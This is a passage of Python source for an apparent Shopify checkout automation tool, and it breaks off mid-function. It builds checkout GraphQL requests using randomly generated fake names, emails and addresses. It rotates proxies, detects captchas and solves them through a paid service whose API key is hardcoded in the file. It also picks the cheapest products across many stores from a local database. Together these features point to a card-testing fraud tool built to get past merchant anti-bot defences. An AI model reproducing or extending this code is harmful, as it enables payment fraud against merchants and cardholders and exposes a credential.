import asyncio
import aiohttp
import json
import re
import random
import argparse
from urllib.parse import urlparse
from flask import Flask, request, jsonify
import os
import time
import threading

import sys
if sys.platform == "win32":
    try:
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    except Exception:
        pass

# Module-level thread-local storage for event loop reuse across requests
_thread_local = threading.local()

# Product/variant cache (1 hour TTL)
_product_cache = {}
CACHE_TTL = 3600  # 1 hour (3600 seconds) cache per site


QUERY_PROPOSAL_SHIPPING = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken sellerProposal{__typename isShippingRequired runningTotal{__typename ...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}delivery{__typename ...on FilledDeliveryTerms{deliveryLines{availableDeliveryStrategies{...on CompleteDeliveryStrategy{handle amount{__typename ...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}__typename}__typename}__typename}...on UnavailableTerms{__typename}}tax{__typename ...on FilledTaxTerms{totalTaxAmount{__typename ...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}}payment{__typename ...on FilledPaymentTerms{availablePaymentLines{paymentMethod{...on PaymentProvider{paymentMethodIdentifier name extensibilityDisplayName __typename}...on OffsiteProvider{paymentMethodIdentifier name __typename}...on CustomOnsiteProvider{paymentMethodIdentifier name __typename}__typename}__typename}__typename}}merchandise{__typename ...on FilledMerchandiseTerms{merchandiseLines{stableId totalAmount{__typename ...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}__typename}}__typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage __typename}}__typename}}"""

QUERY_PROPOSAL_DELIVERY = QUERY_PROPOSAL_SHIPPING

MUTATION_SUBMIT = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input,attemptToken:$attemptToken,metafields:$metafields,postPurchaseInquiryResult:$postPurchaseInquiryResult,analytics:$analytics){__typename ...on SubmitSuccess{receipt{__typename ...on ProcessedReceipt{id token confirmationPage{url shouldRedirect __typename}orderStatusPageUrl redirectUrl orderIdentity{id buyerIdentifier __typename}poNumber __typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id __typename}__typename}__typename}...on SubmitAlreadyAccepted{receipt{__typename ...on ProcessedReceipt{id token confirmationPage{url shouldRedirect __typename}orderStatusPageUrl redirectUrl orderIdentity{id buyerIdentifier __typename}poNumber __typename}...on ProcessingReceipt{id pollDelay __typename}__typename}__typename}...on SubmittedForCompletion{receipt{__typename ...on ProcessedReceipt{id token confirmationPage{url shouldRedirect __typename}orderStatusPageUrl redirectUrl orderIdentity{id buyerIdentifier __typename}poNumber __typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id __typename}__typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{code localizedMessage nonLocalizedMessage ...on ConfirmChangeViolation{from to} __typename}__typename}...on Throttled{pollAfter queueToken __typename}__typename}}"""

QUERY_POLL = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){__typename ...on ProcessedReceipt{id token confirmationPage{url shouldRedirect __typename}orderStatusPageUrl redirectUrl orderIdentity{id buyerIdentifier __typename}poNumber paymentDetails{paymentGateway paymentCardBrand __typename}__typename}...on FailedReceipt{id processingError{__typename ...on PaymentFailed{code messageUntranslated __typename}...on InventoryClaimFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}__typename}__typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}__typename}}"""

COUNTRY_ADDRESSES = {
    "US": [
        {"address1": "4521 Broadway Ave",   "city": "Chicago",       "postalCode": "60613", "zoneCode": "IL", "countryCode": "US", "phone": "3125557842"},
        {"address1": "1847 Maple Drive",    "city": "Houston",       "postalCode": "77002", "zoneCode": "TX", "countryCode": "US", "phone": "7135552341"},
        {"address1": "392 Oak Street",      "city": "Phoenix",       "postalCode": "85001", "zoneCode": "AZ", "countryCode": "US", "phone": "6025551234"},
        {"address1": "7834 Pine Ave",       "city": "Philadelphia",  "postalCode": "19103", "zoneCode": "PA", "countryCode": "US", "phone": "2155559876"},
        {"address1": "2201 Cedar Blvd",     "city": "San Antonio",   "postalCode": "78201", "zoneCode": "TX", "countryCode": "US", "phone": "2105554567"},
        {"address1": "934 Elm Street",      "city": "San Diego",     "postalCode": "92101", "zoneCode": "CA", "countryCode": "US", "phone": "6195552345"},
        {"address1": "5512 Birch Lane",     "city": "Dallas",        "postalCode": "75201", "zoneCode": "TX", "countryCode": "US", "phone": "2145556789"},
        {"address1": "1103 Walnut Drive",   "city": "Jacksonville",  "postalCode": "32099", "zoneCode": "FL", "countryCode": "US", "phone": "9045551234"},
        {"address1": "678 Spruce Street",   "city": "Columbus",      "postalCode": "43004", "zoneCode": "OH", "countryCode": "US", "phone": "6145557890"},
        {"address1": "2847 Willow Way",     "city": "Charlotte",     "postalCode": "28201", "zoneCode": "NC", "countryCode": "US", "phone": "7045553456"},
    ],
    "NL": [
        {"address1": "Kalverstraat 42",      "city": "Amsterdam",     "postalCode": "1012 NX", "zoneCode": "NH", "countryCode": "NL", "phone": "0205551234"},
        {"address1": "Coolsingel 105",       "city": "Rotterdam",     "postalCode": "3012 AG", "zoneCode": "ZH", "countryCode": "NL", "phone": "0105554321"},
    ],
    "DE": [
        {"address1": "Friedrichstrasse 43",  "city": "Berlin",        "postalCode": "10117",   "zoneCode": "BE", "countryCode": "DE", "phone": "0305551234"},
        {"address1": "Maximilianstrasse 12", "city": "Munich",        "postalCode": "80539",   "zoneCode": "BY", "countryCode": "DE", "phone": "0895554321"},
    ],
    "GB": [
        {"address1": "221B Baker Street",    "city": "London",        "postalCode": "NW1 6XE", "zoneCode": "ENG","countryCode": "GB", "phone": "02079460123"},
        {"address1": "45 Market Street",     "city": "Manchester",    "postalCode": "M1 1WR",  "zoneCode": "ENG","countryCode": "GB", "phone": "0161555123"},
    ],
    "CA": [
        {"address1": "88 Queen Street",      "city": "Toronto",       "postalCode": "M5J 2J3", "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198"},
        {"address1": "1055 West Georgia St", "city": "Vancouver",     "postalCode": "V6E 3P3", "zoneCode": "BC", "countryCode": "CA", "phone": "6045551234"},
    ],
    "AU": [
        {"address1": "1 Martin Place",       "city": "Sydney",        "postalCode": "2000",    "zoneCode": "NSW","countryCode": "AU", "phone": "0291234567"},
        {"address1": "230 Collins Street",   "city": "Melbourne",     "postalCode": "3000",    "zoneCode": "VIC","countryCode": "AU", "phone": "0395551234"},
    ],
    "FR": [
        {"address1": "15 Rue de Rivoli",     "city": "Paris",         "postalCode": "75004",   "zoneCode": "IDF","countryCode": "FR", "phone": "0145551234"},
    ],
    "IT": [
        {"address1": "Via del Corso 184",    "city": "Rome",          "postalCode": "00186",   "zoneCode": "RM", "countryCode": "IT", "phone": "0655512345"},
    ],
    "ES": [
        {"address1": "Gran Via 28",          "city": "Madrid",        "postalCode": "28013",   "zoneCode": "MD", "countryCode": "ES", "phone": "915551234"},
    ],
}

TLD_TO_COUNTRY = {
    "nl": "NL", "de": "DE", "uk": "GB", "co.uk": "GB", "ca": "CA",
    "au": "AU", "com.au": "AU", "fr": "FR", "it": "IT", "es": "ES",
    "be": "NL", "eu": "NL", "nz": "AU", "co.nz": "AU", "ie": "GB",
    "mx": "US", "in": "US", "us": "US", "com": "US", "net": "US", "org": "US"
}

CURRENCY_TO_COUNTRY = {
    "EUR": "NL", "GBP": "GB", "CAD": "CA", "AUD": "AU", "NZD": "AU",
    "CHF": "DE", "USD": "US"
}

def pick_addr(url=None, currency=None, force_country=None, cc=None):
    if force_country and force_country.upper() in COUNTRY_ADDRESSES:
        addrs = COUNTRY_ADDRESSES[force_country.upper()]
        return random.choice(addrs).copy()

    country = "US"
    if url:
        try:
            dom = urlparse(url if url.startswith("http") else f"https://{url}").netloc.lower()
            parts = dom.split(".")
            if len(parts) >= 2:
                tld2 = ".".join(parts[-2:])
                tld1 = parts[-1]
                if tld2 in TLD_TO_COUNTRY:
                    country = TLD_TO_COUNTRY[tld2]
                elif tld1 in TLD_TO_COUNTRY:
                    country = TLD_TO_COUNTRY[tld1]
        except Exception:
            pass

    if country == "US" and currency and str(currency).upper() in CURRENCY_TO_COUNTRY:
        country = CURRENCY_TO_COUNTRY[str(currency).upper()]
    elif country == "US" and cc and str(cc).upper() in CURRENCY_TO_COUNTRY:
        country = CURRENCY_TO_COUNTRY[str(cc).upper()]

    addrs = COUNTRY_ADDRESSES.get(country, COUNTRY_ADDRESSES["US"])
    return random.choice(addrs).copy()


def capture(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None

def extract_between(text, start, end):
    if not text or not start or not end:
        return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1:
                if end in parts[1]:
                    result = parts[1].split(end, 1)[0]
                    return result if result else None
        return None
    except Exception:
        return None

class Utils:
    @staticmethod
    def get_random_name():
        first_names = ["James", "John", "Robert", "Michael", "William", "David", "Mary", "Patricia", "Jennifer", "Linda"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez"]
        return (random.choice(first_names), random.choice(last_names))
    
    @staticmethod
    def generate_email(first, last):
        domains = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com"]
        return f"{first.lower()}.{last.lower()}@{random.choice(domains)}"

def parse_proxy(proxy_str):
    if not proxy_str:
        return None

    proxy_str = proxy_str.strip()

    # Already a full URL (http://, https://, socks5://, etc.)
    if '://' in proxy_str:
        # Re-parse and re-encode credentials to handle special chars in user/pass
        from urllib.parse import urlparse, quote, urlunparse
        p = urlparse(proxy_str)
        if p.username or p.password:
            user = quote(p.username or '', safe='')
            passwd = quote(p.password or '', safe='')
            host = p.hostname
            port = p.port
            scheme = p.scheme or 'http'
            if port:
                return f"{scheme}://{user}:{passwd}@{host}:{port}"
            return f"{scheme}://{user}:{passwd}@{host}"
        return proxy_str

    # user:pass@host:port format (no scheme)
    if '@' in proxy_str:
        from urllib.parse import quote
        at = proxy_str.rfind('@')
        credentials = proxy_str[:at]
        hostport = proxy_str[at+1:]
        colon = credentials.find(':')
        if colon >= 0:
            user = quote(credentials[:colon], safe='')
            passwd = quote(credentials[colon+1:], safe='')
        else:
            user = quote(credentials, safe='')
            passwd = ''
        return f"http://{user}:{passwd}@{hostport}"

    # host:port:user:pass format
    parts = proxy_str.split(':')
    if len(parts) == 4:
        ip, port, user, password = parts
        from urllib.parse import quote
        return f"http://{quote(user, safe='')}:{quote(password, safe='')}@{ip}:{port}"
    # host:port format
    elif len(parts) == 2:
        ip, port = parts
        return f"http://{ip}:{port}"
    else:
        return proxy_str


# NopeCHA Captcha Solver
NOPECHA_API_KEY = "sub_1UKtctCRwBwvt6ptGsV8aPcg"
NOPECHA_API_URL = "https://api.nopecha.com"


def is_captcha_required(response_text):
    if not response_text:
        return False
    indicators = [
        'CAPTCHA_REQUIRED', '"code":"CAPTCHA_REQUIRED"', "'code':'CAPTCHA_REQUIRED'",
        '"message":"CAPTCHA_REQUIRED"', 'captcha required', 'CAPTCHA CHALLENGE',
        'hcaptcha', 'h-captcha', 'recaptcha', 're-captcha',
    ]
    text_upper = response_text.upper()
    for indicator in indicators:
        if indicator.upper() in text_upper:
            return True
    return False


def _extract_captcha_info(response_text):
    """Extract captcha type and sitekey from Shopify checkpoint response or HTML."""
    if not response_text:
        return None, None, None
    try:
        data = json.loads(response_text)
    except Exception:
        data = {}

    def _search(obj, depth=0):
        if depth > 10 or not obj:
            return None, None, None
        if isinstance(obj, dict):
            for k in ("sitekey", "site_key", "siteKey", "link_hcaptcha_site_key"):
                if k in obj and obj[k]:
                    sk = str(obj[k])
                    ctype = "recaptcha" if "recaptcha" in str(obj).lower() else "hcaptcha"
                    return ctype, sk, obj
            for v in obj.values():
                result = _search(v, depth + 1)
                if result[0]:
                    return result
        elif isinstance(obj, list):
            for item in obj:
                result = _search(item, depth + 1)
                if result[0]:
                    return result
        return None, None, None

    ctype, sk, extra = _search(data)
    if ctype and sk:
        return ctype, sk, extra

    # Regex search across text/HTML
    # UUID pattern for hCaptcha: 8-4-4-4-12 hex
    hc_m = (re.search(r'data-sitekey=["\']([0-9a-fA-F-]{36})["\']', response_text)
            or re.search(r'hcaptcha.*?["\']([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})["\']', response_text, re.DOTALL)
            or re.search(r'"site_key"\s*:\s*"([0-9a-fA-F-]{36})"', response_text)
            or re.search(r'"sitekey"\s*:\s*"([^"]+)"', response_text)
            or re.search(r'"site_key"\s*:\s*"([^"]+)"', response_text)
            or re.search(r'"siteKey"\s*:\s*"([^"]+)"', response_text))
    if hc_m:
        sk = hc_m.group(1)
        ctype = "recaptcha" if "recaptcha" in response_text.lower() and "hcaptcha" not in response_text.lower() else "hcaptcha"
        return ctype, sk, {}

    # reCAPTCHA pattern: 40 char alphanumeric
    rc_m = (re.search(r'recaptcha.*?render=([0-9a-zA-Z_-]{40})', response_text)
            or re.search(r'recaptchaV3.*?siteKey["\']?\s*:\s*["\']([0-9a-zA-Z_-]{40})["\']', response_text)
            or re.search(r'data-sitekey=["\']([0-9a-zA-Z_-]{40})["\']', response_text))
    if rc_m:
        return "recaptcha", rc_m.group(1), {}

    return None, None, None


_ACTIVE_NOPECHA_TASK = None  # (task_id, timestamp)
_CACHED_SOLVED_TOKEN = None  # (token, captcha_type, expire_time)


async def _solve_captcha_nopecha(captcha_type, sitekey, page_url, proxy=None):
    """Solve captcha via NopeCHA Token API. Reuses in-flight task IDs and caches solved tokens."""
    global _ACTIVE_NOPECHA_TASK, _CACHED_SOLVED_TOKEN
    
    # 1. Check if we have a fresh solved token in cache (valid for ~100s)
    if _CACHED_SOLVED_TOKEN:
        c_tok, c_typ, exp_t = _CACHED_SOLVED_TOKEN
        if time.time() < exp_t:
            rem = int(exp_t - time.time())
            print(f"[NopeCHA] ⚡ Reusing cached solved token ({rem}s remaining)!")
            return c_tok
        else:
            _CACHED_SOLVED_TOKEN = None

    nopecha_type_map = {"hcaptcha": "hcaptcha", "recaptcha": "recaptcha2", "turnstile": "turnstile"}
    nc_type = nopecha_type_map.get(captcha_type, "hcaptcha")
    
    payload = {
        "key": NOPECHA_API_KEY,
        "type": nc_type,
        "sitekey": sitekey,
        "url": page_url
    }
    
    if proxy and isinstance(proxy, str):
        try:
            p_parsed = urlparse(proxy)
            if p_parsed.hostname and p_parsed.port:
                payload["proxy"] = {
                    "scheme": p_parsed.scheme or "http",
                    "host": p_parsed.hostname,
                    "port": int(p_parsed.port),
                }
                if p_parsed.username:
                    payload["proxy"]["username"] = p_parsed.username
                if p_parsed.password:
                    payload["proxy"]["password"] = p_parsed.password
        except Exception:
            pass

    token_api_url = "https://api.nopecha.com/token"
    task_id_str = None

    try:
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=150)) as nc_sess:
            # Check if we have a recent active task (< 120s old) already solving on NopeCHA
            if _ACTIVE_NOPECHA_TASK:
                old_tid, old_t = _ACTIVE_NOPECHA_TASK
                if time.time() - old_t < 120:
                    task_id_str = old_tid
                    print(f"[NopeCHA] 🔄 Polling in-flight task ID from previous request: {task_id_str[:25]}...")

            if not task_id_str:
                async with nc_sess.post(token_api_url, json=payload) as r:
                    rj = await r.json()
                
                err_code = rj.get("error")
                if err_code == 11 and _ACTIVE_NOPECHA_TASK:
                    task_id_str, _ = _ACTIVE_NOPECHA_TASK
                    print(f"[NopeCHA] Slot busy (error 11) — polling existing active task: {task_id_str[:25]}...")
                elif err_code and err_code not in (0, 9, 14, 15):
                    print(f"[NopeCHA] Submit error: {rj.get('message', rj)}")
                    return None
                else:
                    task_id = rj.get("data") or rj.get("id")
                    if task_id:
                        task_id_str = str(task_id).strip()
                        _ACTIVE_NOPECHA_TASK = (task_id_str, time.time())
                        print(f"[NopeCHA] Task submitted: {task_id_str[:25]}... ({nc_type}) | Waiting max 2 min (120s)...")
            
            if not task_id_str:
                print(f"[NopeCHA] No task id returned: {rj if 'rj' in locals() else 'None'}")
                return None
            
            # Poll Token API for up to 60 polls (120 seconds / 2 minutes max)
            for poll_idx in range(60):
                await asyncio.sleep(2.0)
                async with nc_sess.get(token_api_url, params={"key": NOPECHA_API_KEY, "id": task_id_str}) as rp:
                    rjp = await rp.json()
                    
                poll_err = rjp.get("error")
                if poll_err in (9, 14, 15):
                    continue
                if poll_err and poll_err not in (0, 9, 14, 15):
                    print(f"[NopeCHA] Poll error: {rjp.get('message', rjp)}")
                    _ACTIVE_NOPECHA_TASK = None
                    return None
                    
                solved_token = rjp.get("data")
                if solved_token:
                    if isinstance(solved_token, list) and solved_token[0]:
                        tok_str = str(solved_token[0])
                    else:
                        tok_str = str(solved_token)
                    
                    if tok_str != task_id_str and len(tok_str) > 50:
                        print(f"[NopeCHA] ⚡ Solved in {(poll_idx + 1) * 2}s! Token: {tok_str[:35]}... (len={len(tok_str)})")
                        _ACTIVE_NOPECHA_TASK = None
                        _CACHED_SOLVED_TOKEN = (tok_str, captcha_type, time.time() + 100)
                        return tok_str
                    
            print("[NopeCHA] Solved timeout (2 minutes exceeded) — skipping")
            _ACTIVE_NOPECHA_TASK = None
            return None
    except Exception as e:
        print(f"[NopeCHA] Exception: {e}")
        return None


async def solve_shopify_captcha(checkout_url, session=None, headers=None, proxy=None, html_text=""):
    """
    Finds the Shopify captcha sitekey (from HTML or known Shopify sitekeys) and solves via NopeCHA.
    Returns (token, captcha_type) or (None, None).
    """
    ctype = None
    sk = None

    # 1. Search in html_text if provided
    if html_text:
        ctype, sk, _ = _extract_captcha_info(html_text)

    # 2. Fetch checkout page if not found
    if not sk and session and checkout_url:
        try:
            h = {**(headers or {}), 'Accept': 'text/html,application/xhtml+xml,*/*;q=0.9'}
            async with session.get(checkout_url, headers=h, proxy=proxy, timeout=aiohttp.ClientTimeout(total=10)) as r_page:
                page_txt = await r_page.text()
                ctype, sk, _ = _extract_captcha_info(page_txt)
        except Exception as e:
            print(f"[NopeCHA] Error fetching page for sitekey: {e}")

    # 3. Fallback to Shopify's default hCaptcha sitekey
    if not sk:
        print("[NopeCHA] Using Shopify default hCaptcha sitekey...")
        sk = "c990b798-289d-473d-8ab0-13f502ba0eb1"
        ctype = "hcaptcha"

    print(f"[NopeCHA] Solving {ctype} with sitekey={sk} on {checkout_url}")
    token = await _solve_captcha_nopecha(ctype, sk, checkout_url, proxy=proxy)
    if token:
        return token, ctype
    return None, None


async def make_graphql_request_with_captcha_handling(
    session, graphql_url, params, headers, json_data,
    checkout_url, max_retries=1, solve_captcha=False, tag=""
):
    """Make a Shopify GraphQL request with automatic NopeCHA captcha solving."""
    response = None
    response_text = ""
    for attempt in range(max_retries + 1):
        try:
            response = await session.post(graphql_url, params=params, headers=headers, json=json_data)
            response_text = await response.text()
            if tag:
                print(f'{tag} GraphQL status={response.status}')
            if (response.status in (429, 430, 502, 503)
                    or response_text.strip().startswith('<!DOCTYPE html>')
                    or response_text.strip().startswith('<html')):
                if attempt < max_retries:
                    await asyncio.sleep(1.0 + attempt * 0.5)
                    continue
                return response, response_text, False
            return response, response_text, False
        except Exception as e:
            if attempt == max_retries:
                return None, str(e), False
            await asyncio.sleep(0.5)
    return response, response_text, False

_product_cache = {}
CACHE_TTL = 86400  # 24 hours TTL

_simple_variants_cache = None

def get_simple_variants():
    global _simple_variants_cache
    if _simple_variants_cache is None:
        try:
            import json
            import os
            file_path = os.path.join(os.path.dirname(__file__), "simple_variants.json")
            if os.path.exists(file_path):
                print(f"[OFFLINE DB] Loading simple_variants.json...")
                with open(file_path, "r", encoding="utf-8") as f:
                    _simple_variants_cache = json.load(f)
                print(f"[OFFLINE DB] Loaded {len(_simple_variants_cache)} domains.")
            else:
                _simple_variants_cache = {}
        except Exception as e:
            print(f"[ERROR] Failed to load simple_variants.json: {e}")
            _simple_variants_cache = {}
    return _simple_variants_cache

_offline_site_cache = {}

def remove_offline_site_from_cache(site_url):
    """Evict a site from the offline cache when it fails or exceeds price limit."""
    try:
        clean = site_url.replace("https://", "").replace("http://", "").split("/")[0].strip().lower()
        for k in list(_offline_site_cache.keys()):
            _offline_site_cache[k] = [s for s in _offline_site_cache[k] if clean not in s.lower()]
    except Exception:
        pass

def remove_site_from_simple_variants(site_url: str):
    """Instantly remove a site from simple_variants.db (SQLite), simple_variants.json, and in-memory caches."""
    if not site_url:
        return
    try:
        clean = site_url.replace("https://", "").replace("http://", "").split("/")[0].strip().lower()
        remove_offline_site_from_cache(site_url)
        
        # Remove from simple_variants.json cache if loaded in memory
        global _simple_variants_cache
        if _simple_variants_cache is not None:
            keys_to_del = [k for k in _simple_variants_cache.keys() if clean in k.lower()]
            for k in keys_to_del:
                _simple_variants_cache.pop(k, None)
                
        # Remove from SQLite simple_variants.db
        import os
        db_path = os.path.join(os.path.dirname(__file__), "simple_variants.db")
        if os.path.exists(db_path):
            import sqlite3
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            variations = [clean, f"https://{clean}", f"http://{clean}", f"https://{clean}/", f"http://{clean}/"]
            cursor.execute("DELETE FROM variants WHERE LOWER(domain) IN (?, ?, ?, ?, ?) OR LOWER(domain) LIKE ?",
                           (clean, f"https://{clean}", f"http://{clean}", f"https://{clean}/", f"http://{clean}/", f"%{clean}%"))
            conn.commit()
            conn.close()
            print(f"[INSTANT REMOVE] Deleted {clean} from simple_variants.db")
    except Exception as e:
        print(f"[ERROR] Failed to remove {site_url} from simple_variants.db: {e}")

def get_offline_site_with_variant(target_price_range=None):
    """Pick a random site + variant from the offline DB matching target_price_range.
       Returns: (site_url, variant_id, price)
    """
    import os
    import random
    
    # Default target parsing: default is 1-15$ range
    min_r, max_r = 1.0, 15.0
    if target_price_range:
        tr_str = str(target_price_range).strip().lower()
        if tr_str in ("1", "1-10", "1-15", "1-15$"):
            min_r, max_r = 1.0, 15.0
        elif tr_str in ("2", "11-20", "16-25", "16-25$"):
            min_r, max_r = 11.0, 25.0
        elif tr_str in ("3", "21-49", "26-49", "26-49$"):
            min_r, max_r = 21.0, 49.0
        elif tr_str in ("4", "above_50", "above 50", "above 50$"):
            min_r, max_r = 50.0, 999999999.0
        elif tr_str in ("random", "unknown", "all", "any"):
            min_r, max_r = 0.0, 999999999.0
        else:
            try:
                parts = tr_str.split('-')
                min_r = float(parts[0])
                max_r = float(parts[1]) if len(parts) > 1 else 999999999.0
            except Exception:
                min_r, max_r = 1.0, 15.0
                
    db_path = os.path.join(os.path.dirname(__file__), "simple_variants.db")
    if os.path.exists(db_path):
        try:
            import sqlite3
            conn = sqlite3.connect(db_path, timeout=3.0)
            cursor = conn.cursor()
            cursor.execute('''
                SELECT domain, variant_id, price FROM variants 
                WHERE price >= ? AND price <= ? 
                ORDER BY RANDOM() LIMIT 1
            ''', (min_r, max_r))
            row = cursor.fetchone()
            conn.close()
            if row:
                dom, vid, pr = row
                dom_clean = dom if str(dom).startswith('http') else f"https://{dom}"
                return dom_clean, str(vid), float(pr)
        except Exception as e:
            print(f"[ERROR] SQLite offline site query failed: {e}")
            
    # Fallback to JSON
    sv = get_simple_variants()
    if sv:
        domains = list(sv.keys())
        random.shuffle(domains)
        for d in domains:
            variants_map = sv[d]
            for v_id, v_price_str in variants_map.items():
                try:
                    price_f = float(v_price_str)
                    if min_r <= price_f <= max_r:
                        d_clean = d if str(d).startswith('http') else f"https://{d}"
                        return d_clean, str(v_id), price_f
                except Exception:
                    pass
    return None, None, None


def get_offline_site(target_price_range=None):
    """Pick a random site from the offline DB that has a variant matching target_price_range."""
    res = get_offline_site_with_variant(target_price_range)
    if res and res[0]:
        return res[0]
    return None


def get_offline_variant_for_site(site, target_price_range=None):
    """Return (variant_id, price) for a specific site whose variant price is in target_price_range, else (None, None)."""
    import os
    ranges = {
        "1-10": (1.0, 15.0), "1-15": (1.0, 15.0),
        "11-20": (11.0, 25.0), "16-25": (11.0, 25.0),
        "21-49": (21.0, 49.0), "26-49": (21.0, 49.0),
        "above_50": (50.0, 999999999.0),
    }
    min_r, max_r = ranges.get(str(target_price_range or "1-10").strip().lower(), (1.0, 15.0))
    dom = str(site).replace("https://", "").replace("http://", "").strip("/").split("/")[0].lower()
    db_path = os.path.join(os.path.dirname(__file__), "simple_variants.db")
    if os.path.exists(db_path):
        try:
            import sqlite3
            conn = sqlite3.connect(db_path, timeout=3.0)
            cur = conn.cursor()
            cur.execute(
                "SELECT variant_id, price FROM variants WHERE domain IN (?, ?, ?) AND price >= ? AND price <= ? ORDER BY RANDOM() LIMIT 1",
                (dom, f"https://{dom}", f"http://{dom}", min_r, max_r),
            )
            row = cur.fetchone()
            conn.close()
            if row:
                return str(row[0]), float(row[1])
        except Exception as e:
            print(f"[ERROR] per-site variant query failed: {e}")
    return None, None

async def fetch_products(domain, proxy_str=None, target_price_range=None):
    try:
        if not domain.startswith('http'):
            domain = "https://" + domain

        # Validate domain — reject malformed URLs
        parsed = urlparse(domain)
        host = parsed.netloc or parsed.path
        if '.' not in host or ' ' in host or not host:
            return False, f"Site Error! Status: 0"
        if parsed.scheme not in ('http', 'https'):
            return False, f"Site Error! Status: 0"

        cache_key = f"{domain}_{target_price_range or 'any'}"
        now = time.time()
        if cache_key in _product_cache:
            ts, cached_val = _product_cache[cache_key]
            if now - ts < CACHE_TTL:
                print(f"[FETCH CACHE HIT] {domain}")
                return cached_val

        # We will use offline DB as fallback later
        def _get_offline_fallback():
            domain_clean = domain.rstrip('/')
            
            # Parse targets — map bucket names to actual dollar ranges (with shipping/tax buffer)
            _bucket_ranges = {"1-10": (1.0, 15.0), "11-20": (11.0, 25.0), "21-49": (21.0, 49.0)}
            min_r_local, max_r_local = 0.0, 999999999.0
            if target_price_range:
                if target_price_range in _bucket_ranges:
                    min_r_local, max_r_local = _bucket_ranges[target_price_range]
                elif target_price_range == "above_50":
                    min_r_local, max_r_local = 50.0, 999999999.0
                else:
                    try:
                        parts = str(target_price_range).split('-')
                        min_r_local = float(parts[0])
                        max_r_local = float(parts[1]) if len(parts) > 1 else 999999999.0
                    except Exception:
                        min_r_local, max_r_local = 0.0, 999999999.0

            valid_sv_items = []
            import os
            db_path = os.path.join(os.path.dirname(__file__), "simple_variants.db")
            if os.path.exists(db_path):
                try:
                    import sqlite3
                    conn = sqlite3.connect(db_path)
                    cursor = conn.cursor()
                    cursor.execute('''
                        SELECT variant_id, price FROM variants 
                        WHERE domain IN (?, ?, ?) AND price >= ? AND price <= ?
                    ''', (domain_clean, domain_clean.replace("https://", ""), domain_clean.strip(), min_r_local, max_r_local))
                    rows = cursor.fetchall()
                    conn.close()
                    for v_id, v_price in rows:
                        valid_sv_items.append({
                            'price': str(v_price),
                            'variant_id': v_id,
                            'product_handle': 'offline_product',
                            'link': f"{domain_clean}/cart/{v_id}:1"
                        })
                except Exception as e:
                    print(f"[ERROR] SQLite variant query failed: {e}")
            else:
                sv = get_simple_variants()
                if domain_clean in sv:
                    variants_map = sv[domain_clean]
                    for v_id, v_price_str in variants_map.items():
                        try:
                            price_f = float(v_price_str)
                            if min_r_local <= price_f <= max_r_local:
                                valid_sv_items.append({
                                    'price': str(price_f),
                                    'variant_id': v_id,
                                    'product_handle': 'offline_product',
                                    'link': f"{domain_clean}/cart/{v_id}:1"
                                })
                        except Exception:
                            pass

            if valid_sv_items:
                valid_sv_items.sort(key=lambda x: float(x['price']))
                res_local = valid_sv_items[0]
                _product_cache[cache_key] = (now, res_local)
